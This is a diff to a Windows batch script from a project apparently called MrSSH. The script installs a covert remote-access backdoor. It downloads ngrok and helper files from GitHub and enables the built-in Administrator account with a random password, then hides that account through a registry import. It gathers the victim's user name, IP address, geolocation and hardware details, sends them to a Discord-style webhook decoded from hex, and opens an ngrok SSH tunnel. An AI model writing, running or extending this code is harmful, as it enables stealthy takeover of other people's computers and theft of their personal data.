@@ -1,17 +1,45 @@
-@echo off
+@echo on
 setlocal enabledelayedexpansion
+chcp 65001 >nul
 pushd %temp%
+mkdir %temp%\TempFolder
+mkdir %temp%\Files
 
 :: <Variables>
+set "Token=%~1"
 set "Version=1.0"
 set "DefaultToken=dheb"
 set Files=NgrokRun.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
 set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
 set "Folder=%temp%\Files"
+set "TFolder=%temp%\TempFolder"
 :: </Variables>
 
+pushd !Folder!
+
+:: <Token Check>
+if not defined Token set "Token=!DefaultToken!"
+curl -L# "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "!Folder!\Redirect.ini"
+find /c "!token!" redirect.ini >NUL
+if %errorlevel% equ 1 goto notfound
+goto found
+:notfound
+echo TokenExists: False>!TFolder!\TokenCheck.txt
+exit
+:found
+if !Token!==!DefaultToken! (echo TokenExists: Didn't specify>!TFolder!\TokenCheck.txt) else (echo TokenExists: True>!TFolder!\TokenCheck.txt)
+:: </Token Check>
+
+:: <Set webhook>
+FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
+set "hexwebhook=%hexwebhook:~-244%"
+echo !hexwebhook!>HexString.hex
+certutil -decodehex HexString.hex output.hex >nul
+set /p webhook=<output.hex
+del HexString.hex output.hex
+:: </Set webhook>
+
 :: <Install>
-mdkir %temp%\Files
 Rem download ngrok anyway, because it often bugs
 curl -L# "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"
 
@@ -23,8 +51,6 @@ if !MissingFiles! geq 1 (
         curl --create-dirs -f#kLo "!temp!\Files\%%a" "!Github!/%%a"
     )
 )
-
-pushd !Folder!
 :: </Install>
 
 powershell ./OpenSSH.ps1
@@ -61,7 +87,6 @@ for %%a in (%list%) do (
    for %%r in (!rnd!) do set "RndAlphaNum=!RndAlphaNum!!set[%%a]:~%%r,1!"
 )
 
-mkdir %temp%\TempFolder
 echo !RndAlphaNum!>%temp%\TempFolder\pass.txt
 
 net user administrator /active:yes
@@ -69,18 +94,6 @@ net user "Administrator" "!RndAlphaNum!"
 
 reg import "!Folder!\hide.reg"
 :: </Create Administrator account, hide it and set strong rndm password for it>
-
-:: <Set webhook>
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "Redirect.ini"
-FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
-FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
-set "hexwebhook=%hexwebhook:~-244%"
-echo !hexwebhook!>HexString.hex
-certutil -decodehex HexString.hex output.hex >nul
-set /p PlainString=<output.hex
-del HexString.hex output.hex
-set webhook=!PlainString!
-:: </Set webhook>
 
 :: <Get Network and Hardware>
 for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
@@ -97,4 +110,4 @@ if "!proxy!"=="false" (
 
 call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n%VPN% **VPN:** %VPNi% \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**PC Specification**__\\n\\n:floppy_disk: **RAM:** %RAM%\\n\\n:nut_and_bolt: **CPU:** %CPU%\\n\\n:joystick: **GPU:** %GPU%\\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
-call NgrokRun.bat
+call NgrokRun.bat !token!
